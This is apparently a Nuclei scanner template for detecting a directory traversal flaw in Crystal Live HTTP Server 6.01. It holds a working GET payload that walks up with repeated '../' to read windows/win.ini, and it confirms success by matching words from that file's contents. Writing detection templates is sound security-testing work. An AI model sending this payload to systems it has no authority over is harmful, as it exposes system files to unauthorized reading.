id: crystal-live-http-server-lfi
info:
  author: 0x_Akoko
  name: Crystal Live HTTP Server 6.01 - Directory Traversal
  reference: https://cxsecurity.com/issue/WLB-2019110127
  severity: high
  tags: crystal,lfi
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - bit app support
    - fonts
    - extensions
  method: GET
  path:
  - '{{BaseURL}}/../../../../../../../../../../../../windows/win.ini'
  stop-at-first-match: true
